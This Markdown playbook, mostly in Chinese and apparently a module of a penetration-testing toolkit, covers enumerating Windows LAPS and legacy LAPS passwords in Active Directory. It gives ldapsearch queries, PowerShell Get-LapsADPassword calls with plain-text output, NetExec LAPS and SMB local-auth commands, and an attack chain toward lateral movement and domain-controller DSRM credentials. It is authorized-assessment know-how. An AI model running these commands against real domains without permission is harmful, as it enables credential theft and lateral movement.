# Windows LAPS / Legacy LAPS — 2026 Enumeration & Credential Access

Windows LAPS 与 legacy Microsoft LAPS 必须分开枚举。不要只查 `ms-Mcs-AdmPwd`。

---

## 1. Schema / Attribute Mapping

Legacy LAPS：

```text
ms-Mcs-AdmPwd
ms-Mcs-AdmPwdExpirationTime
```

Windows LAPS：

```text
msLAPS-PasswordExpirationTime
msLAPS-Password
msLAPS-EncryptedPassword
msLAPS-EncryptedPasswordHistory
msLAPS-EncryptedDSRMPassword
msLAPS-EncryptedDSRMPasswordHistory
msLAPS-CurrentPasswordVersion   # Windows Server 2025 forest schema
```

`msLAPS-CurrentPasswordVersion` 只有 Windows Server 2025 forest schema 才有；不是 `Update-LapsADSchema` 单独加出来的普通属性。

---

## 2. LDAP 枚举

```bash
# Legacy
ldapsearch -x -H ldap://DC-IP -D 'jen@corp.com' -w 'pass' \
  -b 'dc=corp,dc=com' '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))' \
  dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# Windows LAPS schema / readable attributes
ldapsearch -x -H ldap://DC-IP -D 'jen@corp.com' -w 'pass' \
  -b 'dc=corp,dc=com' '(objectClass=computer)' \
  dNSHostName msLAPS-PasswordExpirationTime msLAPS-Password \
  msLAPS-EncryptedPassword msLAPS-CurrentPasswordVersion
```

如果属性存在但值不可读：记录为 **LAPS deployed / no read right**，继续检查 ACL/extended rights。

---

## 3. PowerShell — 官方 Windows LAPS

在有 Windows LAPS module 的管理主机：

```powershell
Get-LapsADPassword -Identity WS01 -AsPlainText
Get-LapsADPassword -Identity WS01 -IncludeHistory -AsPlainText
Find-LapsADExtendedRights -Identity 'OU=Workstations,DC=corp,DC=com'
```

`Get-LapsADPassword` 能在调用者有权限时处理 clear-text 或 encrypted Windows LAPS password，并可读取 password history。

对 DC 还要判断是否启用了 DSRM password backup；可读 DSRM material 是高价值 AD credential path。

---

## 4. NetExec

```bash
# 现有环境中快速检查 LAPS 可读性
nxc ldap DC-IP -u jen -p 'pass' -M laps

# 已得到本地管理员 LAPS password 后，验证目标主机
nxc smb WS01 -u Administrator -p 'LAPS_PASSWORD' --local-auth
```

不要把“一台主机 LAPS 密码可用”推断成全网复用；Windows LAPS 的目标就是每设备独立轮换。

---

## 5. Attack Value

```text
Readable local-admin LAPS
→ target-local Administrator foothold
→ AD lateral/host access chain

Readable DSRM LAPS on DC
→ high-value DC recovery credential candidate

Write/extended rights over LAPS attributes/policy objects
→ /ad-attack ACL path
```

密码已读取后不必强制切 `/creds`；如果当前选择的是 AD attack direction，可直接在 AD 链中验证和横移。只有需要跨平台 cracking/secret classification 时才考虑后续 `/creds`。

### Primary references
- https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference
- https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps
- https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-powershell
